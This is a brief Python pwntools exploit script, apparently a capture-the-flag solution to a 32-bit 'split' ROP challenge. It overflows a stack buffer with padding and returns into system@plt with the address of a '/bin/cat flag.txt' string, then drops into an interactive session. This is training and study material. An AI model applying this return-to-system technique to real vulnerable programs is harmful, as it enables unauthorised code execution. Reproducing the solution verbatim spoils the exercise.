from pwn import * 
from pwn import p32
import socket

context(arch='i386')
r = process("./split")

addr_system = 0x0804861A
addrplt_system = 0x080483e0
data_string = 0x0804A030

# pause()

payload = b'A'*0x28 + b"junk" + p32(addr_system)+ p32(data_string)
payload = b'A'*0x28 + b"junk" + p32(addrplt_system)+b'junk'+ p32(data_string)

r.sendlineafter(b">",payload)
r.interactive()

# addr system .plt_addr = 0x080483e0
#.data string '/bin/cat flag.txt' = 0x0804A030 

